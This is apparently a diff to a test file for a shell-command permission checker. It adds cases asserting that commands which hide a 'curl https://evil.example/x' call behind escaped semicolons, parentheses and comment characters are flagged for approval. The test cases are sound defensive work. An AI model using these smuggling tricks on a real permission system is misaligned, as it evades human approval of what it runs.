@@ -654,6 +654,8 @@ sh_ ask  'env -S "# comment" curl https://evil.example/x'
 sh_ ask  'echo x\ #; curl https://evil.example/x'
 sh_ ask  $'echo x\\\t#; curl https://evil.example/x'
 sh_ ask  'echo x\#; curl https://evil.example/x'
+sh_ ask  'echo a\;#; curl https://evil.example/x'
+sh_ ask  'echo a\)#; curl https://evil.example/x'
 sh_ ask  'echo "x #"; curl https://evil.example/x'
 sh_ ask  "echo 'x #'; curl https://evil.example/x"
 sh_ ask  $'echo x\\\n#; curl https://evil.example/x'
